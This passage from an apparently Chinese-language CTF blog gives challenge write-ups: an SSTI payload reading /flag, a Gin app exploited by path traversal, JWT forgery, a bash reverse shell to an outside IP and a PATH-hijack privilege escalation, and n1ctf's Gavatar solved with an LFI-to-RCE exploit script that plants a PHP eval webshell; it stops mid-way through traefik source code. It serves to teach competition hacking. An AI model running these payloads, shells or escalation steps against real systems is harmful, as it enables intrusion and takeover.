class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">c:</span>=b.__base__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">d:</span>=c.__subclasses__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">e:</span>=d()[156]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">f:</span>=e.__init__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g:</span>=f.__globals__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">z:</span>=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">h:</span>=g[z]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">i:</span>=h[&#x27;op&#x27;&#x27;en&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x:</span>=i(<span class="hljs-name">&quot;/flag&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">y:</span>=x.read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171805552.png" alt="image-20250215171805552"></p><h1 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h1><p>å…ˆçœ‹æºç ï¼Œå‘ç°å†downloadè·¯ç”±å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œæ²¡å¯¹è¾“å…¥è¿›è¡Œå¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">func Download(c *gin.Context) &#123;<br>filename := c.DefaultQuery(<span class="hljs-string">&quot;filename&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> filename == <span class="hljs-string">&quot;&quot;</span> &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, nil, <span class="hljs-string">&quot;Filename is required&quot;</span>)<br>&#125;<br>basepath := <span class="hljs-string">&quot;./uploads&quot;</span><br>filepath, _ := url.JoinPath(basepath, filename)<br><span class="hljs-keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">404</span>, nil, <span class="hljs-string">&quot;File not found&quot;</span>)<br>&#125;<br>c.Header(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span>+filename)<br>c.File(filepath)<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬ä¼ <code>filename=../config/key.go</code>æ‹¿åˆ°keyçš„ä¸€éƒ¨åˆ†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> config<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Key</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;r00t32l&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Year</span><span class="hljs-params">()</span></span> <span class="hljs-type">int64</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">2025</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨çœ‹ä»–çš„keyçš„ç”Ÿæˆé€»è¾‘</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateKey</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br>rand.Seed(config.Year())<br>randomNumber := rand.Intn(<span class="hljs-number">1000</span>)<br>key := fmt.Sprintf(<span class="hljs-string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())<br><span class="hljs-keyword">return</span> key<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±å¯ä»¥ç”Ÿæˆkey</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215172821196.png" alt="image-20250215172821196"></p><p>æ‹¿åˆ°keyé‚£å°±å¯ä»¥è¿›è¡Œjwtä¼ªé€ ç”Ÿæˆadminçš„token</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN<span class="hljs-number">1</span>YiI<span class="hljs-number">6</span>InVzZXIgdG<span class="hljs-number">9</span>rZW<span class="hljs-number">4</span>iLCJleHAiOjE<span class="hljs-number">3</span>Mzk<span class="hljs-number">2</span>OTc<span class="hljs-number">3</span>NjQsImlhdCI<span class="hljs-number">6</span>MTczOTYxMTM<span class="hljs-number">2</span>NH<span class="hljs-number">0</span>.ARUWYZnXAJTR<span class="hljs-number">0</span>QmR-Vn<span class="hljs-number">4e49</span>HEPI<span class="hljs-number">1</span>o<span class="hljs-number">4</span>CpSvrxP<span class="hljs-number">3</span>NBVgM<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œrceäº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">containsBannedPackages</span><span class="hljs-params">(code <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    importRegex := <span class="hljs-string">`(?i)import\s*\((?s:.*?)\)`</span><br>    re := regexp.MustCompile(importRegex)<br>    matches := re.FindStringSubmatch(code)<br>    imports := matches[<span class="hljs-number">0</span>]<br>    log.Println(imports)<br>    <span class="hljs-keyword">if</span> strings.Contains(imports, <span class="hljs-string">&quot;os/exec&quot;</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸è®©os&#x2F;execï¼Œæˆ‘ä»¬ç”¨syscall</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;syscall&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    syscall.Exec(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>&#125;, []<span class="hljs-type">string</span>&#123;&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>åå¼¹shell</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">8.138.181.58</span>/<span class="hljs-number">32771 0</span>&gt;&amp;<span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215174943757.png" alt="image-20250215174943757"></p><p>å‡çš„ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰suidææƒ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/usr/bin/chsh<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/su</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/mount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/gpasswd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/umount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/sudo</span><br><span class="hljs-regexp">/.../</span>Cat<br></code></pre></td></tr></table></figure><p>æœ‰ä¸ª&#x2F;â€¦&#x2F;Catè¿è¡Œæ—¶ï¼Œå…¶å®æ˜¯è¿è¡Œäº†<code>system(&#39;cat /flag&#39;)</code>é‚£æˆ‘ä»¬å°è¯•ç¯å¢ƒå˜é‡åŠ«æŒcatå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash&#x27;</span> &gt; /tmp/cat<br><span class="hljs-built_in">chmod</span> +x /tmp/cat <br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>/.../Cat<br></code></pre></td></tr></table></figure><p>å‘ç°æˆ‘ä»¬çš„æƒé™å˜æˆroot</p><p>å†æ‹¿flagï¼Œä¸èƒ½ç”¨catäº†</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215175852729.png" alt="image-20250215175852729"></p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqliteæ³¨å…¥</tag>
      
      <tag>linuxææƒ</tag>
      
      <tag>æ—¶é—´ç›²æ³¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>n1ctf</title>
    <link href="/tuyi/2025/02/09/n1ctf/"/>
    <url>/tuyi/2025/02/09/n1ctf/</url>
    
    <content type="html"><![CDATA[<h1 id="n1ctf"><a href="#n1ctf" class="headerlink" title="n1ctf"></a>n1ctf</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>n1æˆ˜é˜Ÿçš„æ‹›æ–°èµ›ï¼Œé¢˜ç›®éƒ½éå¸¸æœ‰æ·±åº¦ï¼Œå¹³æ—¶çš„çŸ¥è¯†ç‚¹ä½†æ˜¯å¾ˆæ·±å…¥ï¼Œå†™ä¹‹å‰è¿˜æŠ±æœ‰ä¸€ä¸è¿›å…¥æˆ˜é˜Ÿçš„å¹»æƒ³ï¼Œæ‹¼å°½å…¨åŠ›æ— æ³•æˆ˜èƒœ</p><p>å…¨æ˜¯å¤§ä½¬</p><p><strong>å†™å‡º4é¢˜å…¶ä¸­<code>Easydb</code>æ˜¯åœ¨<code>23ï¼š08</code>å†™å‡ºæäº¤</strong></p><h2 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h2><p>å†™äº†å¾ˆä¹…ï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œæœ‰ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯é‚£ä¸ªæƒé™å®åœ¨æ²¡æ³•ç»•</p><p>åé¢çªç„¶æƒ³èµ·è¿™æ˜¯LFIé‚£æ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨å»å¹´é‚£ä¸ªcveï¼Œç»“æœå°±æˆäº† ^_^</p><p><a href="https://xz.aliyun.com/news/14127">LFIåˆ°RCE</a>æ„Ÿè°¢<a href="https://blog.kengwang.com.cn/archives/640/?replyTo=535">kengwang</a>å¸ˆå‚…è®©æˆ‘äº†è§£</p><p>ç°åœ¨åˆ†æä¸€ä¸‹æˆ‘çš„æ€è·¯</p><p>åˆ†ææºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">upload.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">getCurrentUser</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span>) <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br><br><span class="hljs-variable">$avatarDir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatars&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$avatarDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$avatarDir</span>, <span class="hljs-number">0755</span>);<br><br><span class="hljs-variable">$avatarPath</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$avatarDir</span>/<span class="hljs-subst">&#123;$user[&#x27;id&#x27;]&#125;</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$finfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]), [<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$avatarPath</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$image</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image</span> === <span class="hljs-literal">false</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid URL&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$avatarPath</span>, <span class="hljs-variable">$image</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸€ä¸ª<code>file_get_contents</code>å‡½æ•°</p><p>æ–‡ä»¶ä¸Šä¼ é‚£å—æµ‹äº†å¾ˆä¹…ï¼Œç»“æœmimeç±»å‹ä¸€ç›´é”™ï¼Œå€’æ˜¯<code>file_get_contents</code>å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p><p>æ‹¿åˆ°äº†ä¸€äº›ä¸œè¥¿</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;users&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3522418a-e150-41b3-9a7d-ac41d3f4576a&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$2y$10$TJqRZATYatGq16hhzgFNye.mJ83nblneeHXFFIArCsInETF1l2IXy&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ²¡å•¥ç”¨ï¼Œå¡äº†å‡ ä¸ªå°æ—¶</p><p><strong>æ­£ç¡®æ–¹æ³•ï¼š</strong></p><p>LFI to RCE</p><p><a href="https://www.cnblogs.com/ddd-flag">å…·ä½“åŸç†å‚è€ƒ</a></p><p><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">è„šæœ¬åœ°å€</a></p><p>æŠŠRomoteç±»æ”¹æˆè¿™æ ·â€”-æ³¨æ„ç”¨æˆ·åå’Œcookieæ›¿æ¢æˆè‡ªå·±çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br>        <span class="hljs-variable language_">self</span>.session.headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>,<br>            <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=3b3e88b173b7a66ef0d737c1d6dd92b6&quot;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        files = &#123;<br>        <span class="hljs-string">&quot;avatar&quot;</span>: (<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>),  <span class="hljs-comment"># ç©ºæ–‡ä»¶</span><br>        <span class="hljs-string">&quot;url&quot;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>),  <span class="hljs-comment"># æ™®é€šå­—æ®µ</span><br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;url:  <span class="hljs-subst">&#123;self.url&#125;</span>&quot;</span>)<br>        req1=<span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/upload.php&quot;</span>, files=files)<br>        req2=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req2<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mysend</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        req=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;(.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> base64.decode(data)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><p>è¿è¡Œpoc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py http://39.106.16.204:12626/ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27;</span> &gt; 1.php<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®1.php POSTä¼ å‚</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209224407146.png" alt="image-20250209224407146"></p><h2 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h2><p>æºç </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;archive/zip&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;path/filepath&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/google/uuid&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&quot;./uploads&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipSimpleFile</span><span class="hljs-params">(file *zip.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>outFile, err := os.Create(filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> outFile.Close()<br><br>fileInArchive, err := file.Open()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span 